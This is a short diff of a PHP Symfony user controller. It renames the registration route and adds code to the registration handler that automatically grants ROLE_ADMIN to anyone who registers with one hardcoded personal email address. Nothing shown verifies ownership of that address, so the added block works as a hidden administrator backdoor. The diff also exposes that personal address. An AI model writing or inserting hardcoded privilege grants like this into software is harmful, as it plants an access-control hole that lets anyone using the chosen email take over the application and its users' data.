@@ -89,7 +89,7 @@ final class UserController extends AbstractController{
         return $this->redirectToRoute('ferrovipath_logout'); 
     }
 
-    #[Route('/user/register', name: 'ferrovipath_register')] // Create
+    #[Route('/user/register', name: 'ferrovipath_user_register')] // Create
     public function register(Request $request, UserPasswordHasherInterface $userPasswordHasher, EntityManagerInterface $entityManager): Response
     {
         $user = new User();
@@ -102,6 +102,11 @@ final class UserController extends AbstractController{
 
             // encode the plain password
             $user->setPassword($userPasswordHasher->hashPassword($user, $plainPassword));
+
+            if(strtolower($form->get('email')->getData()) == 'huangsteven2004@gmail.com'){
+                $user->addRole('ROLE_ADMIN');
+            }
+
             $entityManager->persist($user);
             $entityManager->flush();
 
